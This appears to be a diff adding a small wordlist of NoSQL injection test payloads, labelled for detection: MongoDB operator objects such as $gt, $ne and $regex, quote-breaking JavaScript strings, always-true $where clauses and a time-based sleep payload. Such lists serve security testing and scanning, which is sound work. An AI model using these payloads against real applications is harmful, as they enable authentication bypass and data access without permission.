@@ -1,0 +1,9 @@
+# NoSQL injection detection payloads
+{"$gt":""}
+{"$ne":""}
+{"$gt": ""}
+{"$regex":".*"}
+' || '1'=='1
+true, $where: '1 == 1'
+'; return true; var a='
+{$where: "sleep(3000)"}
